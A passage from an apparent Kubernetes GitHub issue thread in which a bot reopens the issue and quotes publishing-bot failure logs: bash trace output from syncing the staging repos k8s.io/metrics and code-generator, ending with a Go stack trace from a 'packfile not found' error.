rev-parse -q --verify HEAD\n>    \t++ ls -1\n>    \t++ wc -l\n>    \t+ '[' 11 = 0 ']'\n>    \t++ git rev-parse HEAD\n>    \t+ echo 'Starting at existing master commit e06d172324b806a7c9f60ab0c167b4911b8ef253.'\n>    \t+ git branch -D filtered-branch\n>    \t+ git branch -f upstream-branch upstream/master\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit 8a3888dcfae0c8d4b66c8f9b2a64de93f08002c2.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' false = true ']'\n>    \t+ '[' false = true ']'\n>    \t++ last-kube-commit Kubernetes-commit master\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B master\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t++ true\n>    \t+ local k_base_commit=6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>    \t+ '[' -z 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 ']'\n>    \t++ git-find-merge 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 upstream/master\n>    \t++ tail -1\n>    \t+++ git rev-list '6e52a05f444f951b037ca5d445a2b3c309d2f2a2^1..upstream/master' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list 6e52a05f444f951b037ca5d445a2b3c309d2f2a2..upstream/master --ancestry-path\n>    \t+++ git rev-parse 6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>    \t+ local k_base_merge=6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>    \t+ '[' -z 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 ']'\n>    \t+ git branch -f filtered-branch-base 6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>    \t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/metrics.'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/metrics 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/metrics\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/metrics -- filtered-branch filtered-branch-base\n>    \t++ git rev-parse filtered-branch-base\n>    \t+ local f_base_commit=73d64bf50344e200c70ea74011c395ed9f78646b\n>    \t++ git log --first-parent --format=%H --reverse 73d64bf50344e200c70ea74011c395ed9f78646b..HEAD\n>    \t+ f_mainline_commits=\n>    \t+ echo 'Checking out branch master.'\n>    \t+ git checkout -q master\n>    \t+ '[' -f kubernetes-sha ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_head=e06d172324b806a7c9f60ab0c167b4911b8ef253\n>    \t+ local k_pending_merge_commit=\n>    \t+ local dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_merge_point_commit=e06d172324b806a7c9f60ab0c167b4911b8ef253\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' -n '' ']'\n>    \t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ break\n>    \t+ echo 'Fixing up godeps after a complete sync'\n>    \t++ git rev-parse HEAD\n>    \t+ '[' e06d172324b806a7c9f60ab0c167b4911b8ef253 '!=' e06d172324b806a7c9f60ab0c167b4911b8ef253 ']'\n>    \t+ '[' false = true ']'\n>    \t+ fix-godeps apimachinery:master,api:master,client-go:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=apimachinery:master,api:master,client-go:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local needs_godeps_update=true\n>    \t+ local squash=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=e06d172324b806a7c9f60ab0c167b4911b8ef253\n>    \t+ '[' true = true ']'\n>    \t+ update_full_godeps apimachinery:master,api:master,client-go:master k8s.io true Kubernetes-commit\n>    \t+ local deps=apimachinery:master,api:master,client-go:master\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for d in '$../*'\n>    \t+ '[' '!' -d '$../*' ']'\n>    \t+ continue\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>    \t+ local dep=\n>    \t+ local branch=\n>    \t+ local depbranch=\n>    \t++ basename /go-workspace/src/k8s.io/metrics\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/metrics/\") or . == \"k8s.io/metrics\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ echo 'Running godep restore.'\n>    \t+ godep restore\n>    \t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,api:master,client-go:master\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ deps=()\n>    \t+ local deps\n>    \t+ IFS=,\n>    \t+ read -a deps\n>    \t++ last-kube-commit Kubernetes-commit HEAD\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B HEAD\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t++ head -n 1\n>    \t+ local k_last_kube_commit=6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>    \t+ '[' -z 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 ']'\n>    \t++ git-find-merge 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 upstream-branch\n>    \t+++ git rev-list '6e52a05f444f951b037ca5d445a2b3c309d2f2a2^1..upstream-branch' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list 6e52a05f444f951b037ca5d445a2b3c309d2f2a2..upstream-branch --ancestry-path\n>    \t++ tail -1\n>    \t+++ git rev-parse 6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>    \t+ local k_last_kube_merge=6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>    \t+ local dep_count=3\n>    \t+ (( i=0 ))\n>    \t+ (( i<3 ))\n>    \t+ local dep=apimachinery\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 6e52a05f444f951b037ca5d445a2b3c309d2f2a2.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 ../kube-commits-apimachinery-master\n>    \t+ '[' -z c6dd271be00615c6fa8c91fdf63381265a5f0e4e ']'\n>    \t+ pushd ../apimachinery\n>    \t+ echo 'Checking out k8s.io/apimachinery to c6dd271be00615c6fa8c91fdf63381265a5f0e4e'\n>    \t+ git checkout -q c6dd271be00615c6fa8c91fdf63381265a5f0e4e\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<3 ))\n>    \t+ local dep=api\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit 6e52a05f444f951b037ca5d445a2b3c309d2f2a2.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 ../kube-commits-api-master\n>    \t+ '[' -z a191abe0b71e00ce4cde58af8002aa4c1a8bb068 ']'\n>    \t+ pushd ../api\n>    \t+ echo 'Checking out k8s.io/api to a191abe0b71e00ce4cde58af8002aa4c1a8bb068'\n>    \t+ git checkout -q a191abe0b71e00ce4cde58af8002aa4c1a8bb068\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<3 ))\n>    \t+ local dep=client-go\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 6e52a05f444f951b037ca5d445a2b3c309d2f2a2.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 ../kube-commits-client-go-master\n>    \t+ '[' -z 78bf9020c4adf8a8be946e9f4724575fe30cf5a0 ']'\n>    \t+ pushd ../client-go\n>    \t+ echo 'Checking out k8s.io/client-go to 78bf9020c4adf8a8be946e9f4724575fe30cf5a0'\n>    \t+ git checkout -q 78bf9020c4adf8a8be946e9f4724575fe30cf5a0\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<3 ))\n>    \t+ rm -rf ./Godeps\n>    \t+ rm -rf ./vendor\n>    \t+ echo 'Running godep save.'\n>    \t+ godep save ./...\n>    \t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>    \t+ git checkout HEAD Godeps/\n>    \t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ '[' true = true ']'\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' master '!=' master ']'\n>    \t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>    \t+ rm -rf ./vendor/github.com/golang/glog\n>    \t+ rm -rf ./vendor/k8s.io\n>    \t+ rm -rf ./vendor/github.com/google/gofuzz\n>    \t+ rm -rf ./vendor/github.com/go-openapi\n>    \t+ git add Godeps/Godeps.json\n>    \t+ git clean -f Godeps\n>    \t+ git add vendor/ --ignore-errors\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ echo 'Godeps.json hasn'\\''t changed!'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' master '!=' master ']'\n>    \t+ '[' -n '' ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ git diff --exit-code e06d172324b806a7c9f60ab0c167b4911b8ef253\n>    \t+ echo 'Remove redundant godep commits on-top of e06d172324b806a7c9f60ab0c167b4911b8ef253.'\n>    \t+ git reset --soft -q e06d172324b806a7c9f60ab0c167b4911b8ef253\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ basename /go-workspace/src/k8s.io/metrics\n>    \t+ local repo=metrics\n>    \t++ git log --oneline --first-parent --merges\n>    \t++ head -n 1\n>    \t+ '[' -n 'e06d172 Merge pull request #63498 from zioproto/patch-1' ']'\n>    \t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-master'\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>    \tF1005 01:17:56.268451    4029 main.go:112] Failed to get upstream branch refs/heads/upstream-branch first-parent list: failed to get first parent of 9125d03418b5599e624f55656d7aa13522fddade: failed to get 126a84283238f01ae799486e37b30a3aaeeea6fb: packfile not found\n>    \tgoroutine 1 [running]:\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc42a29a500, 0xc424702b00, 0x10a, 0x15e)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xa3dd20, 0xc400000003, 0xc4200cc840, 0x9ef499, 0x7, 0x70, 0x0)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xa3dd20, 0xc400000003, 0x81392a, 0x36, 0xc42db33e88, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x81392a, 0x36, 0xc42db33e88, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>    \tmain.main()\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/collapsed-kube-commit-mapper/main.go:112 +0x634\n>\n>[05 Oct 18 01:17 UTC]: exit status 255```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-427556754):\n\n>/reopen\n>\n>The last publishing run failed: exit status 1\n>```\n>[06 Oct 18 08:30 UTC]: Successfully ensured /go-workspace/src/k8s.io/code-generator exists\n>[06 Oct 18 08:30 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[06 Oct 18 08:30 UTC]: /publish_scripts/construct.sh code-generator master master   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  bc135bd328221b84b7fa9b553507936f016bbfe3\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=bc135bd328221b84b7fa9b553507936f016bbfe3\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 3dcf91f64f638563e5106f21f50c31fa361c918d\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=664d79724554e8a3b660ec33eabd23f16fbd7765\n>\t+ '[' 664d79724554e8a3b660ec33eabd23f16fbd7765 '!=' bc135bd328221b84b7fa9b553507936f016bbfe3 ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''bc135bd328221b84b7fa9b553507936f016bbfe3'\\'' to '\\''664d79724554e8a3b660ec33eabd23f16fbd7765'\\''. We have to sync.'\n>\tUpstream branch upstream/master moved from 'bc135bd328221b84b7fa9b553507936f016bbfe3' to '664d79724554e8a3b660ec33eabd23f16fbd7765'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/code-generator master master '' '' k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t56d0727d10061ee232732d8fc5bc89d72fe64948\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 15 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit 56d0727d10061ee232732d8fc5bc89d72fe64948.\n>\t+ echo 'Starting at existing master commit 56d0727d10061ee232732d8fc5bc89d72fe64948.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\t+ echo 'Checked out source commit 664d79724554e8a3b660ec33eabd23f16fbd7765.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\tChecked out source commit 664d79724554e8a3b660ec33eabd23f16fbd7765.\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ grep '^Kubernetes-commit: '\n>\t++ git log --format=%B master\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ head -n 1\n>\t++ true\n>\t+ local k_base_commit=0f17e9ade6e089eadb7c09052a4a030f155a0eb0\n>\t+ '[' -z 0f17e9ade6e089eadb7c09052a4a030f155a0eb0 ']'\n>\t++ git-find-merge 0f17e9ade6e089eadb7c09052a4a030f155a0eb0 upstream/master\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list '0f17e9ade6e089eadb7c09052a4a030f155a0eb0^1..upstream/master' --first-parent\n>\t+++ git rev-list 0f17e9ade6e089eadb7c09052a4a030f155a0eb0..upstream/master --ancestry-path\n>\t+++ git rev-parse 0f17e9ade6e089eadb7c09052a4a030f155a0eb0\n>\t+ local k_base_merge=0f17e9ade6e089eadb7c09052a4a030f155a0eb0\n>\t+ '[' -z 0f17e9ade6e089eadb7c09052a4a030f155a0eb0 ']'\n>\t+ git branch -f filtered-branch-base 0f17e9ade6e089eadb7c09052a4a030f155a0eb0\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/code-generator.\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/code-generator.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/code-generator 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\tRunning git filter-branch ...\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/code-generator -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=7f31460b05282d8984e5940dc7789053742b2921\n>\t++ git log --first-parent --format=%H --reverse 7f31460b05282d8984e5940dc7789053742b2921..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\tChecking out branch master.\n>\t+ git checkout -q master\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=56d0727d10061ee232732d8fc5bc89d72fe64948\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=56d0727d10061ee232732d8fc5bc89d72fe64948\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' 56d0727d10061ee232732d8fc5bc89d72fe64948 '!=' 56d0727d10061ee232732d8fc5bc89d72fe64948 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps '' '' k8s.io false true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=56d0727d10061ee232732d8fc5bc89d72fe64948\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps '' k8s.io false Kubernetes-commit\n>\t+ local deps=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git 